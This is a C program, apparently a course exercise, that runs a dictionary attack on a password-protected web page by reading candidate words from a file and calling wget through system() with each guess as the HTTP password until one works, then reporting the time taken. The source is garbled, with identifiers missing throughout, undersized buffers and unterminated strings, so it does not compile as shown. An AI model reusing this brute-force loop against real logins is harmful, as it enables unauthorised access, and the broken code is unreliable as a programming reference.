#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <sys/time.h>


#define SUCCESS 0;
#define FAILURE 1;
#define FOUND 2;
#define SECONDS 1e9


int findPassword(char *);

int ()
{
	FILE *fp;
	char word[64];
	char pass[3];
	int found;
	int incr=0;
	int , end, final;
	
	if ((fp = fopen("words","r")) == NULL) 
	{
		printf("Could Not open File -  tset.txt");
		return FAILURE;
		
	}
	printf("\n FILE SUCCESSFULLY opened");
	 = time();
	while (fgets(word, 64, fp) != NULL) 
	{	
		incr++;	
		word[strlen(word) - 1] = '\0';
		strncpy(pass,word,3);	
		found = findPassword(pass);	
		printf("\nTrial %d ",incr);
		if(found == 2)
		{
			printf("\nPASSWORD FOUND   --   %s",pass);
			end = time();
			final = end-;
			printf(" %lld nanoseconds   find the Password \n",final);
			printf(" %lld nanoseconds (%1f seconds)  find the Password \n",final,(double)final/SECONDS);
			return SUCCESS;
		}		
	}
	fclose(fp);	
	return SUCCESS;	
}


int findPassword(char *pass)
{
	char var[50]="";	
	char [50]="";
	strcpy(var,"wget --non-verbose --http-user= --http-passwd=");
		
	strcpy(," http://sec-crack.cs.rmit.edu./SEC/2/index.php");
	strcat(var,pass);
	strcat(var,);
	if(system(var)==0)
	{		
		return 2;
	}	
		
	return SUCCESS;
}
